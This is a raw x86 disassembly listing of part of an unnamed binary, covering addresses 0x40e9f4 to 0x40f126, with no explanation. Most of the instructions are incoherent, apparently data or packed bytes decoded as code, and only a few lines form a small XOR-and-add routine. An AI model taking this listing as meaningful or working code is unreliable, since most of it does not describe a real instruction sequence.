  40e9f4:	imul   esp,eax,0xbd2ac75a
  40e9fa:	imul   BYTE PTR [ebp+0x41]
  40e9fd:	lock xchg edx,eax
  40e9ff:	lahf   
  40ea00:	jp     0x40ea1b
  40ea02:	sbb    ebp,DWORD PTR [ebx+0x327e43c8]
  40ea08:	mov    BYTE PTR [esi],al
  40ea0a:	cmc    
  40ea0b:	fneni(8087 only) 
  40ea0d:	mov    cl,0x2e
  40ea0f:	push   0xea1478e3
  40ea14:	dec    edx
  40ea15:	jmp    0x493d:0x2ae1cc20
  40ea1c:	pop    esp
  40ea1d:	outs   dx,BYTE PTR ds:[esi]
  40ea1e:	and    esp,DWORD PTR [esi-0x5]
  40ea21:	pushf  
  40ea22:	fs jns 0x40ea7c
  40ea25:	ja     0x40e9e8
  40ea27:	dec    ecx
  40ea28:	xor    eax,0xa9be0c5c
  40ea2d:	jnp    0x40e9b7
  40ea2f:	std    
  40ea30:	mov    dh,0xce
  40ea32:	push   edi
  40ea33:	test   eax,0xb082a4bc
  40ea38:	out    0x7c,eax
  40ea3a:	inc    edx
  40ea3b:	and    al,0x3f
  40ea3d:	mov    edi,0x3a02c85
  40ea42:	ins    BYTE PTR es:[edi],dx
  40ea43:	mov    BYTE PTR [ecx-0x67],0x4a
  40ea47:	pop    ebx
  40ea48:	push   ecx
  40ea49:	fs sbb eax,0x876cdab5
  40ea4f:	pop    ecx
  40ea50:	pusha  
  40ea51:	jmp    0xe179ad88
  40ea56:	nop
  40ea57:	push   cs
  40ea58:	lahf   
  40ea59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea5a:	stos   DWORD PTR es:[edi],eax
  40ea5b:	inc    edi
  40ea5c:	pop    ds
  40ea5d:	in     eax,dx
  40ea5e:	push   ebx
  40ea5f:	lahf   
  40ea60:	ds in  al,dx
  40ea62:	test   al,0x39
  40ea64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea65:	ins    DWORD PTR es:[edi],dx
  40ea66:	pop    ebp
  40ea67:	loope  0x40ea1f
  40ea69:	jb     0x40ea3e
  40ea6b:	clc    
  40ea6c:	cdq    
  40ea6d:	mov    bl,0x32
  40ea6f:	adc    DWORD PTR [edi-0x3e],eax
  40ea72:	loope  0x40eabd
  40ea74:	fmul   st,st(3)
  40ea76:	sbb    ch,BYTE PTR [edi-0x6c]
  40ea79:	jl     0x40eac6
  40ea7b:	add    al,0x59
  40ea7d:	push   edx
  40ea7e:	fs stos DWORD PTR es:[edi],eax
  40ea80:	jmp    0x1424:0x480b7109
  40ea87:	arpl   WORD PTR [edx+eiz*2+0x76],bx
  40ea8b:	push   ebp
  40ea8c:	lods   al,BYTE PTR ds:[esi]
  40ea8d:	mov    eax,ebp
  40ea8f:	popa   
  40ea90:	sbb    eax,DWORD PTR [ebp-0x36]
  40ea93:	pop    ds
  40ea94:	inc    edx
  40ea95:	pop    ebp
  40ea96:	or     eax,0xa41dce2d
  40ea9b:	push   esi
  40ea9c:	icebp  
  40ea9d:	mov    eax,DWORD PTR [ebp-0x8]
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0x583fe94
  40ead0:	push   ecx
  40ead1:	or     bh,BYTE PTR ds:0x7c7cad97
  40ead7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40ea63
  40eadc:	xchg   esp,eax
  40eadd:	sbb    BYTE PTR [edx+0x2db511e0],dl
  40eae3:	push   edi
  40eae4:	jo     0x40eb27
  40eae6:	mov    dl,0x2
  40eae8:	(bad)  
  40eae9:	call   0x2376:0x94bce33f
  40eaf0:	call   0xd953be7a
  40eaf5:	out    dx,al
  40eaf6:	pop    es
  40eaf7:	adc    al,0x78
  40eaf9:	push   edx
  40eafa:	ret    0xe7bd
  40eafd:	int    0x8e
  40eaff:	std    
  40eb00:	cmp    al,BYTE PTR [bx+di]
  40eb03:	pop    esi
  40eb04:	ret    0x4299
  40eb07:	pop    eax
  40eb08:	and    al,0xb8
  40eb0a:	imul   ecx,DWORD PTR [ecx+esi*4+0x7a],0xffffffe6
  40eb0f:	jecxz  0x40eb17
  40eb11:	imul   ecx,ebx,0xfab6edc
  40eb17:	sbb    esi,ebx
  40eb19:	(bad)  
  40eb1a:	in     al,dx
  40eb1b:	jae    0x40eb27
  40eb1d:	push   0x5335e6be
  40eb22:	xor    DWORD PTR [ebp+0x659b9fe5],esp
  40eb28:	ffree  st(6)
  40eb2a:	mov    BYTE PTR [ecx-0xa],bl
  40eb2d:	rol    BYTE PTR [ebp+0x47],0x99
  40eb31:	cli    
  40eb32:	xlat   BYTE PTR ds:[ebx]
  40eb33:	cvttps2pi mm1,xmm4
  40eb36:	in     al,0x95
  40eb38:	out    0xd8,al
  40eb3a:	lea    ebp,[esi-0x76]
  40eb3d:	jb     0x40eae9
  40eb3f:	push   cs
  40eb40:	loopne 0x40eafe
  40eb42:	dec    esp
  40eb43:	in     al,0xc1
  40eb45:	jne    0x40ebaa
  40eb47:	mov    ch,0xc3
  40eb49:	adc    eax,0xcd7c745d
  40eb4e:	and    BYTE PTR [edx],dl
  40eb50:	sbb    ebp,esi
  40eb52:	les    esi,FWORD PTR [eax-0x1c]
  40eb55:	xor    BYTE PTR [bx+si],ch
  40eb58:	xchg   ebx,eax
  40eb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb5a:	jmp    0x1b42:0x91e763b9
  40eb61:	dec    edx
  40eb62:	out    0x22,al
  40eb64:	aad    0x24
  40eb66:	and    ecx,ebp
  40eb68:	mov    bh,0xe8
  40eb6a:	sbb    DWORD PTR [esi-0x51],esp
  40eb6d:	xor    al,0x4e
  40eb6f:	cmp    DWORD PTR [edx-0x2f],ebp
  40eb72:	add    ebx,DWORD PTR [edi-0x2a]
  40eb75:	add    cl,BYTE PTR [eax+0x2f]
  40eb78:	mov    ebx,0xf95d61ed
  40eb7d:	pop    es
  40eb7e:	sbb    eax,ebp
  40eb80:	mov    ds:0x7b89f666,eax
  40eb85:	sbb    BYTE PTR [eax-0x6cd0ea88],0xdb
  40eb8c:	jae    0x40ebe2
  40eb8e:	or     eax,0xb3b7894b
  40eb93:	adc    ecx,esp
  40eb95:	or     BYTE PTR [esi+0x79],0x95
  40eb99:	pop    esi
  40eb9a:	pop    esi
  40eb9b:	pop    eax
  40eb9c:	test   eax,0x5db3e7be
  40eba1:	fnsave [eax]
  40eba3:	das    
  40eba4:	mov    ecx,0xd5032b08
  40eba9:	sub    al,0x63
  40ebab:	outs   dx,BYTE PTR ds:[esi]
  40ebac:	popa   
  40ebad:	in     eax,0xdf
  40ebaf:	pop    ecx
  40ebb0:	repz jne 0x40ec2f
  40ebb3:	dec    esp
  40ebb4:	adc    ah,dh
  40ebb6:	icebp  
  40ebb7:	test   al,0xc9
  40ebb9:	jae    0x40eb66
  40ebbb:	jb     0x40ec07
  40ebbd:	and    dh,ah
  40ebbf:	xor    edi,DWORD PTR [ebp-0x1af69fdc]
  40ebc5:	(bad)  
  40ebc6:	push   ebp
  40ebc7:	push   cs
  40ebc8:	fwait
  40ebc9:	xchg   BYTE PTR [edi+0x2016e42],ah
  40ebcf:	imul   al
  40ebd1:	or     DWORD PTR [esi-0x59],ebx
  40ebd4:	pusha  
  40ebd5:	and    ebx,ebp
  40ebd7:	clc    
  40ebd8:	test   BYTE PTR [ecx+0xe7bfd9d],bh
  40ebde:	lock dec ecx
  40ebe0:	cli    
  40ebe1:	ins    BYTE PTR es:[edi],dx
  40ebe2:	out    dx,al
  40ebe3:	sub    ah,BYTE PTR [ebp+0x28542bbd]
  40ebe9:	icebp  
  40ebea:	lods   al,BYTE PTR ds:[esi]
  40ebeb:	int    0x74
  40ebed:	mov    dl,BYTE PTR [eax-0x52]
  40ebf0:	in     eax,0xa5
  40ebf2:	sbb    DWORD PTR [edx],esp
  40ebf4:	iret   
  40ebf5:	sbb    bl,ah
  40ebf7:	arpl   WORD PTR [ecx-0x64],bx
  40ebfa:	or     eax,0x9348942f
  40ebff:	dec    ecx
  40ec00:	push   esi
  40ec01:	stc    
  40ec02:	(bad)  
  40ec03:	sbb    eax,0x76366c58
  40ec08:	loopne 0x40ec43
  40ec0a:	sub    ah,ch
  40ec0c:	rcr    bl,0x5f
  40ec0f:	pop    edx
  40ec10:	adc    edx,DWORD PTR [esi-0x2a]
  40ec13:	and    esp,ebx
  40ec15:	outs   dx,DWORD PTR ds:[esi]
  40ec16:	cli    
  40ec17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec18:	pop    ss
  40ec19:	mov    cl,BYTE PTR [ebp-0x110ee512]
  40ec1f:	aam    0xb8
  40ec21:	jle    0x40ebb6
  40ec23:	cmc    
  40ec24:	push   bx
  40ec26:	loope  0x40ec33
  40ec28:	js     0x40ec28
  40ec2a:	or     DWORD PTR [ebx+0x9],esi
  40ec2d:	adc    cl,BYTE PTR [eax-0x76e2f3bc]
  40ec33:	leave  
  40ec34:	(bad)  
  40ec35:	lock or bh,ch
  40ec38:	sbb    DWORD PTR [esp+ebp*2],esi
  40ec3b:	mov    ebp,0x1ef5bc49
  40ec40:	retf   
  40ec41:	mov    ebx,0x7dc1e556
  40ec46:	or     cl,BYTE PTR [eax+0x17]
  40ec49:	xor    edi,DWORD PTR [edi]
  40ec4b:	sub    DWORD PTR [ebx],ecx
  40ec4d:	repnz adc eax,DWORD PTR [eax]
  40ec50:	out    dx,eax
  40ec51:	pop    esp
  40ec52:	add    eax,0x75d08fde
  40ec57:	add    DWORD PTR [eax+0x3661b0e2],edi
  40ec5d:	adc    BYTE PTR [ebp+eax*8+0x26e7eedc],ah
  40ec64:	cli    
  40ec65:	sub    al,0x3
  40ec67:	jae    0x40ec88
  40ec69:	inc    edx
  40ec6a:	shl    ecx,cl
  40ec6c:	in     al,0xa8
  40ec6e:	ds cmp al,0x44
  40ec71:	imul   ebp,DWORD PTR [eax],0xffffffe7
  40ec74:	xlat   BYTE PTR ds:[ebx]
  40ec75:	pop    esi
  40ec76:	outs   dx,BYTE PTR ds:[esi]
  40ec77:	cmp    eax,0x2a511eef
  40ec7c:	lods   eax,DWORD PTR ds:[esi]
  40ec7d:	lods   eax,DWORD PTR ds:[esi]
  40ec7e:	int3   
  40ec7f:	push   ebx
  40ec80:	pop    ebp
  40ec81:	inc    ecx
  40ec82:	cmc    
  40ec83:	add    eax,0x680e88dd
  40ec88:	push   0x9
  40ec8a:	ins    BYTE PTR es:[edi],dx
  40ec8b:	pushf  
  40ec8c:	mov    dl,0x17
  40ec8e:	push   ebx
  40ec8f:	add    eax,0xcb5fc886
  40ec94:	sar    BYTE PTR [eax+ecx*1-0x530d4ec2],0xd5
  40ec9c:	pop    ds
  40ec9d:	xchg   ebx,eax
  40ec9e:	js     0x40ece8
  40eca0:	es mov bl,0xc3
  40eca3:	ins    BYTE PTR es:[edi],dx
  40eca4:	pushf  
  40eca5:	cdq    
  40eca6:	das    
  40eca7:	add    al,0x5d
  40eca9:	mov    ds:0xa2774be6,al
  40ecae:	cmp    DWORD PTR [edx+0x4c],esp
  40ecb1:	push   ecx
  40ecb2:	test   eax,0xc43cab56
  40ecb7:	mov    dl,0x7a
  40ecb9:	fldcw  WORD PTR [ebp+0x61]
  40ecbc:	xor    eax,0xca6d8de6
  40ecc1:	rcl    WORD PTR [ecx],1
  40ecc4:	push   esi
  40ecc5:	in     al,0x4b
  40ecc7:	fstp   DWORD PTR [edi-0x13233e2d]
  40eccd:	xor    BYTE PTR ds:0x187605ed,dh
  40ecd3:	dec    edx
  40ecd4:	mov    bh,0xe
  40ecd6:	lods   al,BYTE PTR ds:[esi]
  40ecd7:	dec    edi
  40ecd8:	bound  edi,QWORD PTR [edi-0x19]
  40ecdb:	pop    ds
  40ecdc:	jae    0x40eca5
  40ecde:	cli    
  40ecdf:	test   al,0x27
  40ece1:	xchg   DWORD PTR [eax],edx
  40ece3:	adc    al,0x57
  40ece5:	in     al,dx
  40ece6:	out    0x8a,al
  40ece8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ece9:	push   esi
  40ecea:	call   0xd33667f4
  40ecef:	or     al,0xda
  40ecf1:	dec    eax
  40ecf2:	and    eax,0x87cc9618
  40ecf7:	sub    DWORD PTR [ebp-0x7b],eax
  40ecfa:	or     ch,BYTE PTR [edx+ecx*1]
  40ecfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecfe:	aaa    
  40ecff:	xchg   edi,eax
  40ed00:	aas    
  40ed01:	mov    DWORD PTR [ecx],0x975c8267
  40ed07:	daa    
  40ed08:	loop   0x40ed04
  40ed0a:	push   ds
  40ed0b:	pop    ss
  40ed0c:	sub    bh,BYTE PTR [esi]
  40ed0e:	mov    ebp,DWORD PTR [esi]
  40ed10:	mov    cl,0x24
  40ed12:	sub    al,0x34
  40ed14:	pop    es
  40ed15:	pop    edx
  40ed16:	cdq    
  40ed17:	and    DWORD PTR [edi],ecx
  40ed19:	cmp    eax,0x6a13ed83
  40ed1e:	bound  esi,QWORD PTR [edx+0x4e8c5ae1]
  40ed24:	(bad)  
  40ed26:	loop   0x40ecfb
  40ed28:	hlt    
  40ed29:	mov    ?,WORD PTR [esi+eiz*4]
  40ed2c:	lds    esi,FWORD PTR [esi]
  40ed2e:	sub    eax,0x4317fae8
  40ed33:	pusha  
  40ed34:	or     DWORD PTR [eax-0x72],ecx
  40ed37:	xlat   BYTE PTR ds:[ebx]
  40ed38:	(bad)  
  40ed3a:	push   ss
  40ed3b:	arpl   WORD PTR [ecx-0x5d],si
  40ed3e:	lods   eax,DWORD PTR ds:[esi]
  40ed3f:	mov    edi,0xfe1a2cc9
  40ed44:	jbe    0x40edaa
  40ed46:	fdivr  DWORD PTR [ebp+0x3658b219]
  40ed4c:	ins    DWORD PTR es:[edi],dx
  40ed4d:	std    
  40ed4e:	inc    esi
  40ed4f:	mov    fs,WORD PTR [ebx]
  40ed51:	inc    esi
  40ed52:	outs   dx,BYTE PTR ds:[esi]
  40ed53:	imul   esi
  40ed55:	js     0x40ed22
  40ed57:	push   edi
  40ed58:	push   cs
  40ed59:	mov    ch,0x6e
  40ed5b:	repnz ins BYTE PTR es:[edi],dx
  40ed5d:	arpl   WORD PTR [ecx],sp
  40ed5f:	sbb    ah,BYTE PTR [ecx-0x6b]
  40ed62:	mov    esi,0xd3741b56
  40ed67:	daa    
  40ed68:	retf   
  40ed69:	cli    
  40ed6a:	int3   
  40ed6b:	mov    dl,0x67
  40ed6d:	out    dx,al
  40ed6e:	outs   dx,DWORD PTR ds:[esi]
  40ed6f:	xlat   BYTE PTR ds:[ebx]
  40ed70:	jae    0x40ed99
  40ed72:	xchg   ebx,eax
  40ed73:	int3   
  40ed74:	mov    bl,0x3b
  40ed76:	popf   
  40ed77:	or     eax,0x3b6f2138
  40ed7c:	xor    DWORD PTR [ebx+0x44a2e2cc],ecx
  40ed82:	aad    0x4d
  40ed84:	push   ss
  40ed85:	jg     0x40ed08
  40ed87:	push   eax
  40ed88:	cmc    
  40ed89:	xchg   edx,eax
  40ed8b:	(bad)  
  40ed8c:	scas   al,BYTE PTR es:[edi]
  40ed8d:	ret    
  40ed8e:	out    0x5c,eax
  40ed90:	mov    dh,0xbf
  40ed92:	scas   eax,DWORD PTR es:[edi]
  40ed93:	mov    bh,0x96
  40ed95:	add    BYTE PTR [esi],0xd9
  40ed98:	push   0x8a492c1
  40ed9d:	mov    ah,0x94
  40ed9f:	gs scas eax,DWORD PTR es:[edi]
  40eda1:	jnp    0x40ed8a
  40eda3:	dec    DWORD PTR [ebx+ebp*2-0x9]
  40eda7:	cs iret 
  40eda9:	sbb    eax,0x4c6effd0
  40edae:	xchg   esi,eax
  40edaf:	sahf   
  40edb0:	pop    ss
  40edb1:	jbe    0x40eda0
  40edb3:	dec    ebp
  40edb4:	mov    eax,0xa55903f7
  40edb9:	xor    DWORD PTR [edx-0x23],ecx
  40edbc:	mov    bh,0xf2
  40edbe:	mov    cl,0x1e
  40edc0:	inc    ebp
  40edc1:	mov    BYTE PTR [eax+ebx*8-0x6bd9d63b],bl
  40edc8:	std    
  40edc9:	loop   0x40ee1d
  40edcb:	pop    ss
  40edcc:	dec    ecx
  40edcd:	out    dx,eax
  40edce:	arpl   WORD PTR [ebp+0x4a7c8f9e],sp
  40edd4:	je     0x40ed75
  40edd6:	or     al,0x89
  40edd8:	outs   dx,DWORD PTR ds:[esi]
  40edd9:	xlat   BYTE PTR ds:[ebx]
  40edda:	and    esp,DWORD PTR [edi]
  40eddc:	pop    ebx
  40eddd:	jmp    0x64265743
  40ede2:	das    
  40ede3:	inc    ecx
  40ede4:	xor    edi,esp
  40ede6:	lods   al,BYTE PTR ds:[esi]
  40ede7:	mov    edi,0x23ce736
  40edec:	test   eax,0x83482e3b
  40edf1:	in     eax,dx
  40edf2:	sub    al,0x6c
  40edf4:	addps  xmm5,XMMWORD PTR [edx+0x7c70515c]
  40edfb:	ss jle 0x40ee03
  40edfe:	jp     0x40ee79
  40ee00:	sub    DWORD PTR [ecx+0x3298b105],esp
  40ee06:	mov    dl,0x38
  40ee08:	outs   dx,DWORD PTR ds:[esi]
  40ee09:	jge    0x40ee57
  40ee0b:	aad    0x9d
  40ee0d:	push   edx
  40ee0e:	push   esi
  40ee0f:	mov    ah,0xe2
  40ee11:	mov    bl,0xd2
  40ee13:	icebp  
  40ee14:	add    al,0x28
  40ee16:	imul   edx,DWORD PTR [edx],0x385a5f25
  40ee1c:	pop    esi
  40ee1d:	or     dl,BYTE PTR [eax-0x1de6f6d8]
  40ee23:	test   BYTE PTR ds:0xdcfe7179,dh
  40ee29:	sbb    ebx,DWORD PTR [edi]
  40ee2b:	repz call DWORD PTR [ebx]
  40ee2e:	sbb    edi,eax
  40ee30:	jp     0x40ee45
  40ee32:	arpl   ax,bx
  40ee34:	mov    ss,esi
  40ee36:	repnz test cl,bh
  40ee39:	leave  
  40ee3a:	jle    0x40ee78
  40ee3c:	cmp    bl,BYTE PTR [esi-0x79]
  40ee3f:	nop
  40ee40:	push   ecx
  40ee41:	jl     0x40eec0
  40ee43:	cdq    
  40ee44:	imul   di,WORD PTR [esi+0x2966fc7],0x8776
  40ee4d:	ror    BYTE PTR [ecx+0x7012c74c],1
  40ee53:	nop
  40ee54:	or     al,0x78
  40ee56:	fsub   QWORD PTR [ebx+ecx*4]
  40ee59:	(bad)  
  40ee5b:	loopne 0x40eea3
  40ee5d:	add    eax,0x936d07e3
  40ee62:	jg     0x40eedd
  40ee64:	xchg   ebp,eax
  40ee65:	rcl    DWORD PTR [edx],cl
  40ee67:	xchg   ebp,eax
  40ee68:	jle    0x40eedd
  40ee6a:	js     0x40ee59
  40ee6c:	das    
  40ee6d:	jmp    0x373c:0xaec7865a
  40ee74:	popa   
  40ee75:	jo     0x40eeca
  40ee77:	aas    
  40ee78:	aaa    
  40ee79:	jns    0x40eee9
  40ee7b:	pop    ebp
  40ee7c:	out    0xed,eax
  40ee7e:	and    al,0x51
  40ee80:	cs dec ecx
  40ee82:	out    0x21,eax
  40ee84:	mov    ds:0x413b9a,eax
  40ee89:	mov    eax,DWORD PTR [ebp-0x4]
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	mov    dh,0x6b
  40eea8:	push   es
  40eea9:	pusha  
  40eeaa:	ds test eax,0x79a77c7c
  40eeb0:	jl     0x40ef2e
  40eeb2:	or     ebx,DWORD PTR [eax]
  40eeb4:	jmp    FWORD PTR [ecx+eiz*2+0x47]
  40eeb8:	mov    DWORD PTR [edx-0x20],ebp
  40eebb:	mov    al,0xc9
  40eebd:	es scas al,BYTE PTR es:[edi]
  40eebf:	jle    0x40ee86
  40eec1:	and    dh,bl
  40eec3:	pop    esi
  40eec4:	push   ss
  40eec5:	test   eax,0x5969a1b7
  40eeca:	std    
  40eecb:	pop    edi
  40eecc:	cmp    cl,BYTE PTR [ecx]
  40eece:	push   edi
  40eecf:	and    dl,BYTE PTR [ecx+0x5c]
  40eed2:	mov    dl,BYTE PTR [edi+0x6e]
  40eed5:	pusha  
  40eed6:	mov    al,0x15
  40eed8:	loopne 0x40ee98
  40eeda:	lods   eax,DWORD PTR ds:[esi]
  40eedb:	data16 jle 0x40eee9
  40eede:	ins    BYTE PTR es:[edi],dx
  40eedf:	popa   
  40eee0:	add    al,bl
  40eee2:	adc    DWORD PTR ds:0xbbfd946d,eax
  40eee8:	push   ebp
  40eee9:	push   cs
  40eeea:	xchg   ecx,eax
  40eeeb:	and    BYTE PTR [ebx],bh
  40eeed:	xchg   DWORD PTR [eax+0x75],esi
  40eef0:	inc    ecx
  40eef1:	retf   0xd5c7
  40eef4:	fidivr DWORD PTR [edx+eiz*8-0xb8ca4d1]
  40eefb:	and    dh,BYTE PTR [edx+0x3cf4d9e6]
  40ef01:	jl     0x40ee8d
  40ef03:	lock push esp
  40ef05:	push   edx
  40ef06:	mov    esp,0x45cb9cea
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	test   al,0x3
  40ef0e:	fisttp QWORD PTR [esi+0x36]
  40ef11:	adc    dl,BYTE PTR [esi-0x7ba8e59a]
  40ef17:	retf   
  40ef18:	dec    ecx
  40ef19:	lds    esi,FWORD PTR [edx]
  40ef1b:	sbb    DWORD PTR [ecx-0x5cd96426],0xffffff81
  40ef22:	mov    cl,BYTE PTR [ecx]
  40ef24:	(bad)  
  40ef26:	or     eax,0xf316627c
  40ef2b:	cmp    eax,0x376ba39d
  40ef30:	out    0xe9,al
  40ef32:	aas    
  40ef33:	dec    esi
  40ef34:	mov    eax,DWORD PTR [eax]
  40ef36:	pushf  
  40ef37:	or     al,0x16
  40ef39:	xchg   esi,eax
  40ef3a:	(bad)  
  40ef3b:	jmp    0x7a8c0886
  40ef40:	fsub   QWORD PTR [edi-0x4ebff6ff]
  40ef46:	pop    ebx
  40ef47:	or     BYTE PTR [ecx+0x46],dl
  40ef4a:	dec    ecx
  40ef4b:	cmp    eax,0x58bad350
  40ef50:	mov    bh,0x8b
  40ef52:	lds    ebp,FWORD PTR [edx-0x6f]
  40ef55:	cmc    
  40ef56:	xor    BYTE PTR [edx+edi*4],bh
  40ef59:	iret   
  40ef5a:	das    
  40ef5b:	push   esp
  40ef5c:	fwait
  40ef5d:	pop    ds
  40ef5e:	icebp  
  40ef5f:	mov    ebp,0xea6dc61c
  40ef64:	test   DWORD PTR [esi],esi
  40ef66:	cmp    edi,DWORD PTR [ebp-0x5599ccf9]
  40ef6c:	test   DWORD PTR [esp+eiz*8+0x31],eax
  40ef70:	sti    
  40ef71:	das    
  40ef72:	fsub   QWORD PTR ds:0x8b236491
  40ef78:	gs leave 
  40ef7a:	in     eax,0x4
  40ef7c:	shl    DWORD PTR [edx-0x23335840],0x68
  40ef83:	and    al,0x7f
  40ef85:	pop    ebx
  40ef86:	pop    ebx
  40ef87:	test   BYTE PTR [edx],cl
  40ef89:	jmp    0xd5c25d7a
  40ef8e:	or     ah,0x98
  40ef91:	fidivr WORD PTR [eax+0x1feb2345]
  40ef97:	enter  0x5b62,0x35
  40ef9b:	out    dx,al
  40ef9c:	(bad)  
  40ef9d:	outs   dx,BYTE PTR ds:[esi]
  40ef9e:	data16 mov bh,0x8
  40efa1:	into   
  40efa2:	lock scas al,BYTE PTR es:[edi]
  40efa4:	mov    al,0x17
  40efa6:	xlat   BYTE PTR ds:[ebx]
  40efa7:	aas    
  40efa8:	jne    0x40ef61
  40efaa:	and    cl,BYTE PTR [edx-0x1eb2c1fc]
  40efb0:	or     ch,BYTE PTR [esi]
  40efb2:	pop    ebx
  40efb3:	retf   
  40efb4:	adc    al,0x9d
  40efb6:	fs fwait
  40efb8:	repz in eax,0x9c
  40efbb:	sbb    DWORD PTR [ebx],eax
  40efbd:	stos   BYTE PTR es:[edi],al
  40efbe:	push   0x12
  40efc0:	mov    edx,0x637c4eeb
  40efc5:	or     DWORD PTR [ecx+ecx*4+0x3433804f],ecx
  40efcc:	mov    BYTE PTR [edi+0x14],ch
  40efcf:	pop    esp
  40efd0:	dec    edi
  40efd1:	outs   dx,BYTE PTR ds:[esi]
  40efd2:	test   eax,0x12741c5e
  40efd7:	fstp   TBYTE PTR [eax]
  40efd9:	js     0x40efa8
  40efdb:	adc    BYTE PTR [ebp+0x1a78f240],dh
  40efe1:	sub    dh,BYTE PTR [ecx+0x3a]
  40efe4:	sub    ebx,ecx
  40efe6:	test   DWORD PTR [eax+0x23],esp
  40efe9:	xchg   esi,eax
  40efea:	div    DWORD PTR [edi]
  40efec:	and    al,0x9f
  40efee:	jmp    0x40ef84
  40eff0:	inc    esi
  40eff1:	sbb    dl,bl
  40eff3:	iret   
  40eff4:	shl    DWORD PTR [ebx+esi*2],0x8
  40eff8:	jle    0x40ef95
  40effa:	mov    esi,0xd152df15
  40efff:	cmp    eax,0x4abe
  40f004:	mov    dl,BYTE PTR [edx]
  40f006:	adc    edi,ebx
  40f008:	pop    ecx
  40f009:	ss cmc 
  40f00b:	ss push ss
  40f00d:	arpl   ax,di
  40f00f:	push   esi
  40f010:	push   ss
  40f011:	push   cs
  40f012:	enter  0xb2ef,0xef
  40f016:	push   ebx
  40f017:	cmp    BYTE PTR [ebx-0x5d6535ca],bh
  40f01d:	cmp    DWORD PTR [ebp+0x55b26843],esp
  40f023:	call   0x7093cba6
  40f028:	mov    ebx,0x160fff23
  40f02d:	mov    ss,eax
  40f02f:	dec    edx
  40f030:	jmp    0xa78a:0xab53284d
  40f037:	push   eax
  40f038:	rol    DWORD PTR [edx],cl
  40f03a:	test   DWORD PTR [eax+0x2a],0xd22036fd
  40f041:	test   al,0xa0
  40f043:	push   es
  40f044:	sub    BYTE PTR [edi-0x2c0b4a68],bl
  40f04a:	sub    al,0xb3
  40f04c:	xor    eax,0xbe93a815
  40f051:	push   edi
  40f052:	mov    edx,0x566b08c3
  40f057:	fnstenv [esi+0x7036ba03]
  40f05d:	xchg   BYTE PTR [ebp+0x37f6c9d0],dh
  40f063:	inc    ebx
  40f064:	inc    eax
  40f065:	push   ebx
  40f066:	mov    ebx,0x4b33065a
  40f06b:	out    0x5b,al
  40f06d:	pop    edx
  40f06e:	loope  0x40f072
  40f070:	and    dl,BYTE PTR [edx]
  40f072:	inc    eax
  40f073:	sbb    esi,esi
  40f075:	and    eax,0x874dcb4b
  40f07a:	add    eax,0x8bd7ee94
  40f07f:	or     edx,ecx
  40f081:	in     al,dx
  40f082:	mov    cl,0x46
  40f084:	lods   al,BYTE PTR ds:[esi]
  40f085:	ss or  ebx,ebp
  40f088:	sbb    eax,0xeefcca4e
  40f08d:	cli    
  40f08e:	popa   
  40f08f:	outs   dx,DWORD PTR ds:[esi]
  40f090:	push   ss
  40f091:	xchg   esp,eax
  40f092:	push   ds
  40f093:	or     BYTE PTR [ebp+edi*1+0x76],ch
  40f097:	call   0x566cf5fa
  40f09c:	fs inc ebx
  40f09e:	cld    
  40f09f:	pop    es
  40f0a0:	jmp    0x40f05f
  40f0a2:	xor    BYTE PTR [ebx-0x4a12d858],ah
  40f0a8:	(bad)  
  40f0a9:	out    dx,al
  40f0aa:	ret    0x9074
  40f0ad:	retf   
  40f0ae:	pop    ecx
  40f0af:	inc    esi
  40f0b0:	jl     0x40f10c
  40f0b2:	pop    ss
  40f0b3:	scas   eax,DWORD PTR es:[edi]
  40f0b4:	adc    BYTE PTR [ecx],dl
  40f0b6:	push   eax
  40f0b7:	push   ds
  40f0b8:	imul   esi,DWORD PTR [edx],0x6a
  40f0bb:	xor    bh,dl
  40f0bd:	pusha  
  40f0be:	mov    cl,BYTE PTR [ecx]
  40f0c0:	mov    bh,0x67
  40f0c2:	jmp    0xdba7db92
  40f0c7:	mov    dh,cl
  40f0c9:	icebp  
  40f0ca:	sbb    eax,0x549c393c
  40f0cf:	shl    esi,cl
  40f0d1:	imul   edx,ebx,0x170742e4
  40f0d7:	mov    dl,0xab
  40f0d9:	add    DWORD PTR [edi+edi*1+0x5f50288f],esi
  40f0e0:	xchg   ecx,eax
  40f0e1:	mov    bl,0x27
  40f0e3:	mov    al,ds:0xcd9bf9df
  40f0e8:	nop
  40f0e9:	mov    eax,ds:0xc4e8abef
  40f0ee:	mov    ds:0x6fdbfd9c,al
  40f0f3:	mov    dh,0x1f
  40f0f5:	jno    0x40f10e
  40f0f7:	adc    BYTE PTR [edx+0x6b],bl
  40f0fa:	loopne 0x40f0d5
  40f0fc:	in     al,dx
  40f0fd:	rcr    DWORD PTR [edi+eiz*8+0x6e],0xb7
  40f102:	cmp    esp,ebp
  40f104:	in     al,0x76
  40f106:	pop    edi
  40f107:	sbb    esi,DWORD PTR [ebx+0x32]
  40f10a:	add    edi,DWORD PTR [ebx+eiz*8+0x70]
  40f10e:	xor    esi,esi
  40f110:	sub    eax,0xd65a40a7
  40f115:	sub    ch,BYTE PTR [esi+0x22114319]
  40f11b:	mov    esi,0x44b30bf
  40f120:	in     al,dx
  40f121:	cs push ebx
  40f123:	xchg   ecx,eax
  40f124:	add    al,0x21
  40f126:	popf   
